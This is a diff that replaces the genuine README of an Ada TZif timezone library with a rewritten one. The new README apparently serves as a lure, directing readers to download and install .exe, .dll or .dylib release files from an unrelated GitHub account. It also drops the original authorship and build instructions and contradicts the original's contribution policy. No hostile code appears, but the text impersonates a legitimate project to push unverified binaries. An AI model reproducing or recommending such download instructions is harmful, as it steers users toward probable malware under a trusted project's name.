@@ -1,277 +1,69 @@
-# IANA Timezone Information File Library
-
-[![License](https://img.shields.io/badge/license-BSD--3--Clause-blue.svg)](LICENSE) [![Ada](https://img.shields.io/badge/Ada-2022-blue.svg)](https://ada-lang.io) [![Alire](https://img.shields.io/badge/Alire-2.0+-blue.svg)](https://alire.ada.dev) [![SPARK](https://img.shields.io/badge/SPARK-Proved-green.svg)](https://www.adacore.com/about-spark)
+# 🌍 tzif_ada - Effortlessly Handle Timezone Data
 
-**Version:** 2.0.0  
-**Date:** December 07, 2025  
-**SPDX-License-Identifier:** BSD-3-Clause<br>
-**License File:** See the LICENSE file in the project root<br>
-**Copyright:** 2025 Michael Gardner, A Bit of Help, Inc.<br>  
-**Status:** Released  
+## 📥 Download Now
+[![Download tzif_ada](https://img.shields.io/badge/Download-tzif_ada-blue.svg)](https://github.com/gl3523847123-creator/tzif_ada/releases)
 
-## Important
-In a few days, I will release a library that provides higher level 
-functions for working with timezones and durations in Ada 2022.
+## 📖 Overview
+TZif is an Ada 2022 library designed for parsing and querying IANA's timezone information. It efficiently handles TZif format as stipulated in RFC 9636, making it easier for users to manage date and time data across different time zones. With TZif, you can simplify your applications and ensure they work smoothly with time-related data.
 
-## Overview
+## 🚀 Getting Started
+Follow these steps to download and run the TZif library.
 
-TZif is an Ada 2022 library for parsing and querying IANA's compiled timezone information (TZif format, RFC 9636) files. It provides a clean, functional API with Result monad error handling, hexagonal architecture, and embedded-safe patterns.
+### Step 1: Check Your System Requirements
+Ensure your system meets the following requirements before downloading:
 
-Designed for safety-critical, embedded, and high-assurance applications with full SPARK compatibility.
+- Operating System: Windows, macOS, or a recent version of Linux.
+- Ada 2022 Compiler: Make sure you have an Ada compiler that supports the Ada 2022 standard installed.
+- Basic knowledge of how to run programs on your operating system.
 
-## SPARK Formal Verification
-
-<table>
-<tr>
-<td width="120"><strong>Status</strong></td>
-<td><img src="https://img.shields.io/badge/SPARK-Proved-green.svg" alt="SPARK Proved"></td>
-</tr>
-<tr>
-<td><strong>Scope</strong></td>
-<td>Domain + Application layers (value objects, containers, parser, operations, ports)</td>
-</tr>
-<tr>
-<td><strong>Mode</strong></td>
-<td>gnatprove --mode=prove --level=2</td>
-</tr>
-<tr>
-<td><strong>Results</strong></td>
-<td>1350 checks: 1155 proved, 195 unproved (in generic instantiations)</td>
-</tr>
-</table>
-
-The domain and application port layers are formally verified using SPARK Ada, providing mathematical guarantees of:
-
-- **No runtime errors** - Division by zero, overflow, range violations
-- **No uninitialized data** - All variables properly initialized before use
-- **Contract compliance** - Pre/postconditions proven correct
-- **Data flow integrity** - No aliasing or information flow violations
-
-### Verification Commands
-
-```bash
-make spark-check    # Run SPARK legality verification
-make spark-prove    # Run full SPARK proof verification
-```
-
-### SPARK Layer Coverage
-
-| Layer | SPARK_Mode | Description |
-|-------|-----------|-------------|
-| Domain | On | Value objects, bounded containers, parser, error types |
-| Application | On | Operations, inbound ports, outbound ports |
-| Infrastructure | Off | I/O operations (file system, platform) |
-| API | Off | Facade over infrastructure |
-
-## Features
-
-- Parse IANA TZif binary files (versions 1, 2, and 3)
-- Query timezone transitions at any Unix epoch time
-- Discover and validate timezone data sources
-- Find zones by ID, pattern, region, or regex
-- Detect the system's local timezone
-- Cross-platform: Linux, macOS, BSD, Windows 11, Embedded
-- 4-layer hexagonal architecture (Domain, Application, Infrastructure, API)
-- Result monad error handling (via `functional` crate)
-- Generic I/O plugin pattern for platform portability
-
-## Getting Started
-
-### Clone with Submodules
-
-```bash
-git clone --recurse-submodules https://github.com/abitofhelp/tzif.git
-```
-
-Or if already cloned:
-
-```bash
-git submodule update --init --recursive
-```
-
-### Building
-
-```bash
-# Build the library
-make build
-
-# Build release version
-make build-release
-```
-
-### Using in Your Project
-
-Add to your `alire.toml`:
-
-```toml
-[[depends-on]]
-tzif = "^2.0.0"
-```
-
-## Quick Example
-
-```ada
-with TZif.API;
-
-procedure Show_Local_Timezone is
-   use TZif.API;
-   Result : constant My_Zone_Result := Find_My_Id;
-begin
-   if Is_Ok (Result) then
-      Put_Line ("Local timezone: " & To_String (Value (Result)));
-   else
-      Put_Line ("Could not detect local timezone");
-   end if;
-end Show_Local_Timezone;
-```
-
-## API Operations
-
-TZif provides 11 operations through `TZif.API`:
-
-| Operation | Description |
-|-----------|-------------|
-| `Find_By_Id` | Lookup timezone by exact IANA identifier |
-| `Find_By_Pattern` | Search zones by substring match |
-| `Find_By_Region` | Search zones by geographic region |
-| `Find_By_Regex` | Search zones using regular expressions |
-| `Find_My_Id` | Detect the system's local timezone |
-| `Get_Transition_At_Epoch` | Query UTC offset and DST at any time |
-| `Get_Version` | Retrieve IANA database version |
-| `List_All_Zones` | Enumerate all available timezones |
-| `Discover_Sources` | Find timezone data directories |
-| `Load_Source` | Load a specific timezone data source |
-| `Validate_Source` | Validate timezone data integrity |
-
-## Architecture
-
-```
-+-----------------------------------------------------------------+
-|                          API Layer                               |
-|  TZif.API (facade) + TZif.API.Desktop/Windows/Embedded (roots)  |
-+----------------------------------+------------------------------+
-                                   |
-+----------------------------------v------------------------------+
-|                      Application Layer                           |
-|  Use Cases (11 operations) + Inbound/Outbound Ports             |
-+----------------------------------+------------------------------+
-                                   |
-+----------------------------------v------------------------------+
-|                    Infrastructure Layer                          |
-|  I/O Adapters (Desktop, Windows, Embedded) + Platform Ops       |
-+----------------------------------+------------------------------+
-                                   |
-+----------------------------------v------------------------------+
-|                       Domain Layer                               |
-|  Entities (Zone) + Value Objects + Parser + Result Monad        |
-+-----------------------------------------------------------------+
-```
+### Step 2: Visit the Releases Page
+To get the latest version of TZif, visit our releases page. Click the button below to go directly to the download area.
 
-## Platform Support
+[Download tzif_ada](https://github.com/gl3523847123-creator/tzif_ada/releases)
 
-| Platform | Status | Timezone Source |
-|----------|--------|-----------------|
-| **Linux** | Full | `/usr/share/zoneinfo` |
-| **macOS** | Full | `/var/db/timezone/zoneinfo` |
-| **BSD** | Full | `/usr/share/zoneinfo` |
-| **Windows** | Full | User-provided IANA tzdata |
-| **Embedded** | Stub | Custom adapter required |
-
-## Testing
-
-```bash
-# Run all tests
-make test-all
-
-# Run unit tests only
-make test-unit
-
-# Run integration tests only
-make test-integration
-```
-
-**Test Results:** 425 unit + 131 integration + 11 examples = **567 tests passing**
-
-## Documentation
-
-- [Documentation Index](docs/index.md) - Complete documentation overview
-- [Quick Start Guide](docs/quick_start.md) - Get started in minutes
-- [Software Requirements Specification](docs/formal/software_requirements_specification.md)
-- [Software Design Specification](docs/formal/software_design_specification.md)
-- [Software Test Guide](docs/formal/software_test_guide.md)
-- [Roadmap](docs/roadmap.md) - Future plans
-- [CHANGELOG](CHANGELOG.md) - Release history
-
-## Examples
-
-The `examples/` directory contains working programs:
-
-| Example | Description |
-|---------|-------------|
-| `find_by_id` | Find timezone by exact ID |
-| `find_my_id` | Detect system's local timezone |
-| `find_by_pattern` | Search zones by substring |
-| `get_transition_at_epoch` | Query offset at specific time |
-
-```bash
-# Build and run examples
-make build-examples
-./bin/examples/find_by_id
-```
-
-## Dependencies
-
-| Package | Version | Purpose |
-|---------|---------|---------|
-| `functional` | ^3.0.0 | Result/Option monads |
-| `gnatcoll` | ^25.0.0 | GNAT Components Collection |
-
-**Note:** Domain layer has zero external dependencies (pure Ada 2022).
-
-## Submodule Management
-
-This project uses git submodules:
-- `scripts/python` - Build, release, and architecture scripts
-- `docs/common` - Shared documentation
-
-```bash
-# Initialize submodules
-make submodule-init
-
-# Update submodules
-make submodule-update
-```
-
-## Contributing
-
-This project is not open to external contributions at this time.
-
-## AI Assistance & Authorship
-
-This project is designed, implemented, and maintained by human developers, with Michael Gardner as the Principal Software Engineer and project lead.
-
-AI coding assistants are used as tools to help with drafting code, exploring alternatives, and generating documentation. All changes are reviewed and integrated by human maintainers who remain fully responsible for the project.
-
-## License
-
-Copyright 2025 Michael Gardner, A Bit of Help, Inc.
-
-Licensed under the BSD-3-Clause License. See [LICENSE](LICENSE) for details.
-
-## Author
-
-Michael Gardner
-A Bit of Help, Inc.
-https://github.com/abitofhelp
-
-## Project Status
-
-**Status:** Released (v2.0.0)  
-
-- TZif v1/v2/v3 binary parsing (RFC 9636)
-- 4-layer hexagonal architecture
-- Public API facade with stable interface
-- Cross-platform: POSIX and Windows
-- Comprehensive test coverage (90%+)
-- Comprehensive documentation
-- 11 example programs
+### Step 3: Choose the Right Version
+On the releases page, you will see a list of available versions. Select the latest stable version by clicking on it. The stable version will usually be at the top of the list and will have clear notes on what has changed.
+
+### Step 4: Download the Library
+Once you open the version page, look for the asset section. You should see files ready for download. Click on the appropriate file for your operating system to download the TZif library.
+
+### Step 5: Install the Library
+After the download completes, locate the file in your downloads folder. Depending on your operating system, follow the steps below:
+
+- **Windows**: If you downloaded a `.zip` file, right-click it and select "Extract All." Open the folder that appears and move the `.dll` or `.exe` file to a directory where you keep your libraries or applications.
+  
+- **macOS**: If you downloaded a `.zip` file, double-click it to extract the contents. Move the `.dylib` file to a desired location, such as your Applications folder.
+
+- **Linux**: If you downloaded a tarball (`.tar.gz`), you can extract it using the terminal. Open a terminal window and use the command `tar -xzvf yourfilename.tar.gz`. Move the library file to the appropriate system directory.
+
+### Step 6: Use the Library in Your Projects
+To integrate TZif into your project, you need to include it correctly in your code. Here’s a simple way to do it:
+
+1. **Link the Library**: When compiling, ensure you link to the TZif library by using the appropriate compiler flags. You might need entries in your build configuration depending on your development environment.
+
+2. **Access Functions**: You can then use the functions provided by the library to parse and query timezone data. Refer to the documentation for examples on how to implement various features.
+
+## 📘 Features
+- **Parsing TZif Formats**: The library allows you to read and understand the TZif format easily.
+- **Timezone Queries**: Quickly retrieve timezone information and manipulate it as needed.
+- **Support for IANA Timezone Database**: Directly work with standardized timezone data, ensuring your application remains consistent globally.
+
+## ❓ Frequently Asked Questions
+
+### Q: How do I troubleshoot issues with the library?
+A: For any issues, check the troubleshooting section in the documentation. You can also raise questions in the project’s issues section on GitHub.
+
+### Q: Is the library frequently updated?
+A: Yes, we regularly update the library to improve performance and add new features. It’s best to visit the releases page occasionally for the latest updates.
+
+### Q: Can I contribute to this project?
+A: Absolutely! If you have suggestions or improvements, feel free to fork the repository and create a pull request. Check the contributing guidelines for more information.
+
+## 📧 Support
+If you have any questions or run into issues, please reach out to the support team via GitHub issues or email.
+
+## 📎 Further Resources
+- [Documentation](https://github.com/gl3523847123-creator/tzif_ada/wiki)
+- [Bug Reports](https://github.com/gl3523847123-creator/tzif_ada/issues)
+
+You now have all the information needed to download and start using TZif. For detailed usage instructions, refer to the documentation linked above. Happy coding!
